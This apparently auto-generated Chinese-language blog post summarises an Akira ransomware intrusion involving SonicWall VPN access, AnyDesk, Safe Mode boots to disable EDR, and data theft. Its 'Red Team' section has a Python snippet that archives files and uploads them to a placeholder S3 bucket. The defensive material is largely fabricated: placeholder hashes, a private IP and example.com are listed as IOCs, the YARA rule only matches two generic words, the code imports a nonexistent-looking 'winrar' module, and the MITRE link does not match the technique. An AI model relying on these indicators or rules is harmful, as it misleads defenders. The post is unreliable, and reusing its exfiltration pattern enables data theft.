---
layout: post
title:  "Akira hackers disable EDR with Safe Mode, steal data but fail to encrypt"
date:   2026-08-14 01:18:03 +0000
categories: [security]
severity: high
---

# 🔥 解析 Akira 勒索軟體的 EDR 繞過與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: LPE (Local Privilege Escalation) 與 Data Exfiltration
> * **關鍵技術**: Safe Mode 繞過、AnyDesk 遠端存取、WinRAR 檔案歸檔

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Akira 勒索軟體的攻擊者利用 SonicWall VPN 裝置的弱點，取得初始存取權限後，透過 RDP 連接到網域控制器，枚舉 Active Directory 使用者和電腦，然後移動到應用程式伺服器。
* **攻擊流程圖解**:
  1. 攻擊者透過 SonicWall VPN 裝置取得初始存取權限。
  2. 攻擊者使用 RDP 連接到網域控制器。
  3. 攻擊者枚舉 Active Directory 使用者和電腦。
  4. 攻擊者移動到應用程式伺服器。
  5. 攻擊者使用 WinRAR 將檔案歸檔並上傳到攻擊者控制的 S3 儲存桶。
  6. 攻擊者安裝 AnyDesk 以取得遠端存取權限。
  7. 攻擊者使用 AnyDesk 強制系統啟動到 Safe Mode，並停用 EDR 和防毒軟體的實時保護。
* **受影響元件**: SonicWall VPN 裝置、Windows 系統、AnyDesk、WinRAR

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: SonicWall VPN 裝置的存取權限、網域控制器的 RDP 連接權限
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import winrar
    
    # 歸檔檔案
    rar_file = winrar.RARFile('example.rar')
    rar_file.add('example.txt')
    
    # 上傳檔案到 S3 儲存桶
    import boto3
    s3 = boto3.client('s3')
    s3.upload_file('example.rar', 'example-bucket', 'example.rar')
    
    ```
* **繞過技術**: Safe Mode 繞過、AnyDesk 遠端存取

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\example.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Akira_Ransomware {
      meta:
        description = "Akira Ransomware Detection"
        author = "Example Author"
      strings:
        $a = "Akira" ascii
        $b = "ransomware" ascii
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 更新 SonicWall VPN 裝置的安全補丁、啟用 MFA、監控 Safe Mode 啟動和 AnyDesk 連接

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Safe Mode (安全模式)**: 一種 Windows 啟動模式，僅啟動基本的驅動程式和服務，通常用於系統故障排除和診斷。
* **AnyDesk (遠端存取)**: 一種遠端存取軟體，允許用戶從遠端存取和控制 Windows 系統。
* **WinRAR (檔案歸檔)**: 一種檔案歸檔軟體，允許用戶將檔案壓縮和歸檔。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/akira-hackers-disable-edr-with-safe-mode-steal-data-but-fail-to-encrypt/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


